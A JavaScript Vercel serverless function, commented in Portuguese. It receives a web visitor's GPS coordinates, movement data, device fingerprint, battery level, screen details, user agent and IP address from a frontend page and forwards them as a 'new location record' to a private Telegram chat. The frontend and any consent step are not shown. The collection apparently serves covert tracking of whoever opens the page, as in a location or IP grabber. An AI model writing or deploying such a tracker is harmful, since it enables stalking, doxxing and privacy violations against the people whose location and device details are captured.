// Usamos 'axios' como você já fazia
const axios = require('axios');

// Esta é a função principal que a Vercel executará
export default async function handler(req, res) {
  // --- Configuração de CORS para permitir acesso do seu frontend ---
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // A Vercel precisa que requisições do tipo OPTIONS sejam tratadas
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Garante que apenas requisições POST sejam aceitas
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método não permitido' });
  }

  try {
    // --- Lógica principal do seu código original ---

    // 1. Pega os dados enviados pelo index.html
    const data = req.body;

    // 2. Pega as variáveis de ambiente da Vercel (MUITO MAIS SEGURO!)
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    // Validação para garantir que as variáveis foram configuradas na Vercel
    if (!botToken || !chatId) {
      console.error('As variáveis de ambiente do Telegram não foram configuradas na Vercel.');
      // Não exponha o erro detalhado para o cliente
      return res.status(500).json({ success: false, message: 'Erro de configuração do servidor.' });
    }

    // 3. Pega o IP do usuário da forma correta na Vercel
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'N/A';

    // 4. Monta a mensagem para o Telegram (exatamente como a sua)
    const message = `📡 *Novo Registro de Localização (Vercel):*

🕓 *Horário:* ${new Date(data.timestamp).toLocaleString('pt-BR')}
📍 *Coordenadas:* ${data.latitude}, ${data.longitude}
🌐 *Google Maps:* ${data.maps}
🧭 *Altitude:* ${data.altitude ?? 'N/A'}, Velocidade: ${data.speed ?? 'N/A'}, Direção: ${data.heading ?? 'N/A'}

🧠 *Fingerprint:* ${data.fingerprint ?? 'N/A'}
🔋 *Bateria:* ${data.batteryStatus?.level ?? '?'}% (${data.batteryStatus?.charging ? 'carregando' : 'não'})
📶 *Online:* ${data.isOnline ? 'Sim' : 'Não'}
📱 *Tela:* ${data.screenInfo.width}x${data.screenInfo.height} @${data.screenInfo.devicePixelRatio}x
🧾 *Browser:* ${data.browserInfo.userAgent}
🌍 *IP:* ${ip}`; // Usando o IP capturado pela Vercel

    // 5. Envia a mensagem para o Telegram
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown"
    });

    // 6. Responde ao frontend com sucesso
    res.status(200).json({ success: true });

  } catch (error) {
    // Loga o erro no console da Vercel para você poder depurar
    console.error("Erro ao processar a requisição:", error.message);
    res.status(500).json({ success: false });
  }
}